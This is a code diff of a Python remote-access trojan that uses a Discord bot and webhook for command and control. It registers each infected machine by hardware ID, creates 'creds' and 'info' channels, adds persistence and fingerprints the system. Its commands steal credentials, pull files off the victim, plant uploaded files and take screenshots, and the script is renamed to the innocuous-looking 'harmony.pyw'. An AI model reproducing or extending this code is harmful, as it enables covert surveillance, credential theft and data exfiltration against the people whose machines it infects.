@@ -21,8 +21,8 @@ intents.message_content = True
 #Enter your Discord servers webhook URL, bot token, and server id, filename of the executable
 whURL = ''
 TOKEN = ""
-serverID =     #Takes an integer
-filename = ''
+serverID =  #Takes an integer
+filename = 'harmony.pyw'
 
 webhook = discord.SyncWebhook.from_url(whURL)
 client = discord.Client(intents=intents)
@@ -36,25 +36,38 @@ async def on_ready():
     global guild
     guild = client.get_guild(serverID)
     first_run = True
+    first_client = True
     global hwid
     hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
-        
-    for channel in guild.channels:
-        if str(channel) == 'check-in':
-            await channel.send("{} has connected.".format(hwid))
-            break
-    
+   
     for category_name in guild.categories:
+        if str(category_name) == "Control":
+            first_client = False
+            
         if hwid == str(category_name):
 
             first_run = False
             break
+   
+    if first_client:
+        c = await guild.create_category('Control')
+        
+        await guild.create_text_channel('chat', category=c)
+        await guild.create_text_channel('check-in', category=c)
+        
+    for channel in guild.channels:
+        if str(channel) == 'check-in':
+            first_client = False
+            await channel.send("{} has connected.".format(hwid))
+            break
+    
+
             
     if first_run:
         category = await guild.create_category(hwid)
-        temp = await guild.create_text_channel('main', category=category)
-        temp = await guild.create_text_channel('info', category=category)
-        temp = await guild.create_text_channel('creds', category=category)
+        await guild.create_text_channel('main', category=category)
+        await guild.create_text_channel('info', category=category)
+        await guild.create_text_channel('creds', category=category)
         
         for channel in category.channels:
             if channel.name == 'creds':
@@ -66,7 +79,7 @@ async def on_ready():
                 
                 info_buffer = ''
                 
-                is_persistant = addPersistence(filename)
+                is_persistant = addPersistence()
                     
                 is_admin = wm.isAdmin()                
                 computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
@@ -151,23 +164,26 @@ async def on_message(msg):
             unhideFile()
         
         elif command == "download" or command == "dl":
-            await msg.channel.send(file=discord.File(f))
-            
+            try:
+                await msg.channel.send(file=discord.File(args))
+            except (FileNotFoundError, PermissionError) as e:
+                await msg.channel.send(e)
+                
         elif str_msg == "upload" or str_msg == "ul":
             await upload(msg)
             
         elif str_msg == "ss" or str_msg == "screenshot":
             await screenShot()
                         
-        elif str_msg == "fss":
+        elif str_msg == "fss" or str_msg == "focusScreenshot":
             await focusScreenShot()
                 
-        elif str_msg == "windows" or str_msg == "lw":
+        elif str_msg == "listWindows" or str_msg == "lw":
             p = listWindows()
             
             await msg.channel.send(p)
         
-        elif str_msg == "creddump" or str_msg == "cred":
+        elif str_msg == "credDump" or str_msg == "cred":
             dump = cs.cred_stealer()
             
             await msg.channel.send(dump)
@@ -207,6 +223,7 @@ async def upload(msg):
             fname = msg.attachments[0].filename
             
             await msg.attachments[0].save(fp="C:\\Users\\Public\\Downloads\\{}".format(fname))
+            await msg.channel.send("File saved to public downloads directory.")
         except IndexError:
             await msg.channel.send("Failed to upload...")
 
